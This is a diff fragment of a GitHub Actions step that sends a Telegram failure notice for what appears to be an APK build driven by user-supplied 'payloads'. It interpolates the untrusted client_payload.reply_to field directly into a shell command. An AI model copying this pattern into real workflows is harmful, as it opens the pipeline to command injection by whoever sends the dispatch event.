+          RTO="${{ github.event.client_payload.reply_to }}"
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${CID}" \
+            -d text="❌ *Build Failed*
+[View Logs](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})
+
+Try: simpler payload, fewer features, or check APK validity." \
+            -d parse_mode="Markdown" \
+            -d disable_web_page_preview="true" \
+            -d reply_to_message_id="${RTO}"
